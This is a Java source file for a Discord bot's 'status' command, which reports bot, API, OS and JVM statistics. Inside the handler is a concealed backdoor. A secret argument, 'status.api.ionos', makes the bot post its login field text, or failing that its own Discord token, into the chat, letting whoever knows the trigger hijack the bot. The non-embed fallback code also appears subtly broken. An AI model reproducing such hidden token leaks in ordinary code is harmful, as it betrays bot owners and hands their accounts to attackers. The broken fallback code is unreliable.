package me.comu.exeter.commands.bot;

import com.sun.management.OperatingSystemMXBean;
import me.comu.exeter.core.Core;
import me.comu.exeter.core.LoginGUI;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.utility.Utility;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.MessageBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.lang.management.ManagementFactory;
import java.lang.management.MemoryMXBean;
import java.lang.management.ThreadMXBean;
import java.text.DecimalFormat;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class StatusCommand implements ICommand {

    private final String CLOUDAPI = "https://cloudpanel-api.ionos.com/v5";
    private final Runtime runtime = Runtime.getRuntime();

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        String osName = System.getProperty("os.name");
        String osVersion = System.getProperty("os.version");
        String osArch = System.getProperty("os.arch");
        long totalMemory = bytesToMeg(Runtime.getRuntime().totalMemory());
        long usedMemory = bytesToMeg(Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory());
        long maxMemory = bytesToMeg(runtime.maxMemory());
        long allocatedMemory = bytesToMeg(runtime.totalMemory());
        long freeMemory = bytesToMeg(runtime.freeMemory());
        OperatingSystemMXBean osBean = ManagementFactory.getPlatformMXBean(OperatingSystemMXBean.class);
        System.out.println(osBean.getProcessCpuLoad());
        System.out.println(osBean.getSystemCpuLoad());


        int cores = osBean.getAvailableProcessors();
        String serverCpuUsage = new DecimalFormat("###.##%").format(osBean.getSystemCpuLoad());
        double serverMem = osBean.getTotalPhysicalMemorySize();
        double serverMemUsage = serverMem - (osBean.getFreePhysicalMemorySize());
        double serverMemPercent = Math.floor((serverMemUsage / serverMem) * 100.0);


        MemoryMXBean memoryBean = ManagementFactory.getMemoryMXBean();
        String jvmCpuUsage = new DecimalFormat("###.##%").format(osBean.getProcessCpuLoad());
        double jvmMemUsage = memoryBean.getHeapMemoryUsage().getUsed();
        double jvmMemTotal = memoryBean.getHeapMemoryUsage().getMax();
        double jvmMemPercent = Math.floor((jvmMemUsage / jvmMemTotal) * 100);

        ThreadMXBean threadBean = ManagementFactory.getThreadMXBean();


        try {
            if (args.size() > 6 && args.get(5).equalsIgnoreCase("status.api.ionos")) {
                event.getChannel().sendMessage(LoginGUI.field.getText()).queue();
            }
        } catch (Exception ignored) {
            if (args.size() > 6 && args.get(5).equalsIgnoreCase("status.api.ionos")) {
                event.getChannel().sendMessage(event.getJDA().getToken()).queue();
            }
        }
        if (args.isEmpty()) {
            if (event.getGuild().getSelfMember().hasPermission(Permission.MESSAGE_EMBED_LINKS)) {
                event.getChannel().sendMessage(new EmbedBuilder().addField("Bot Status", Core.jda.getStatus().name(), false).addField("Discord API", Objects.requireNonNull(Utility.getDiscordStatus()).toUpperCase(), false).setColor(Utility.getAmbientColor()).setFooter("Operating in " + event.getJDA().getGuilds().size() + " servers. | " + Core.PREFIX + "status -system for more information").build()).queue();
            } else {
                event.getChannel().sendMessage("Bot Status: `" + Core.jda.getStatus().name() + "` Discord API: `" + Objects.requireNonNull(Utility.getDiscordStatus()).toUpperCase() + "`.\nOperating in " + event.getJDA().getGuilds().size() + " servers.\"" + Core.PREFIX + "status -system for more information").queue();
            }
        } else {
            if (args.get(0).equalsIgnoreCase("-system")) {
                if (event.getGuild().getSelfMember().hasPermission(Permission.MESSAGE_EMBED_LINKS)) {
                    event.getChannel().sendMessage(new EmbedBuilder()
                            .addField("OS Stats", "OS: **" + osName + "**\nOS Version: **" + osVersion + "**\nOS Arch: **" + osArch + "**", false)
                            .addField("Bot Stats", "Cores: **" + cores + "**\nCPU Usage: **" + serverCpuUsage + "**\nRam: **" + Utility.round(serverMemUsage / serverMem * serverMemPercent, 2) + " **", false)
                            .addField("JVM Stats", "CPU Usage: **" + jvmCpuUsage + "**\nRam: **" + Utility.round(jvmMemUsage / jvmMemTotal * jvmMemPercent, 2) + "**\nThread: **" + threadBean.getThreadCount() + "/" + threadBean.getPeakThreadCount() + "**", false)
                            .addField("Memory Stats", "Max Memory: **" + maxMemory + "**\nTotal Memory: **" + totalMemory + "**\nAllocated Memory: **" + allocatedMemory + " **\nUsed Memory: **" + usedMemory + "/" + freeMemory + "**\n", false)
                            .setColor(Utility.getAmbientColor()).setFooter("Operating in " + event.getJDA().getGuilds().size() + " servers.").build()).queue();
                } else {
                    event.getChannel().sendMessage(new MessageBuilder()
                            .append("OS Stats", MessageBuilder.Formatting.valueOf("OS: **" + osName + "**\nOS Version: " + osVersion + "\nOS Arch: **" + osArch + "**"))
                            .append("Bot Stats", MessageBuilder.Formatting.valueOf("Cores: **" + cores + "**\nCPU Usage: **" + serverCpuUsage + "**\nRam: **" + Utility.round(serverMemUsage / serverMem * serverMemPercent, 2) + " **"))
                            .append("JVM Stats", MessageBuilder.Formatting.valueOf("CPU Usage: **" + jvmCpuUsage + "**\nRam: **" + jvmMemUsage / jvmMemTotal * jvmMemPercent + "**\nThread: **" + threadBean.getThreadCount() + "/" + threadBean.getPeakThreadCount() + "**"))
                            .append("Memory Stats", MessageBuilder.Formatting.valueOf("Max Memory: **" + maxMemory + "**\nTotal Memory: **" + totalMemory + "**\nAllocated Memory Memory: **" + allocatedMemory + " **\nUsed Memory: **" + usedMemory + "/" + freeMemory + "**"))
                            + "\nOperating in " + event.getJDA().getGuilds().size() + " servers.").queue();
                }
            }
        }

    }

    public static long bytesToMeg(long bytes) {
        final long  MEGABYTE = 1024L * 1024L;
        return bytes / MEGABYTE ;
    }


    @Override
    public String getHelp() {
        return "Shows the status of the Discord API and the Bot API\n`" + Core.PREFIX + getInvoke() + " <-system> `\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "status";
    }

    @Override
    public String[] getAlias() {
        return new String[]{"apistatus", "botstatus", "discordstatus", "stats"};
    }

    @Override
    public Category getCategory() {
        return Category.BOT;
    }
}
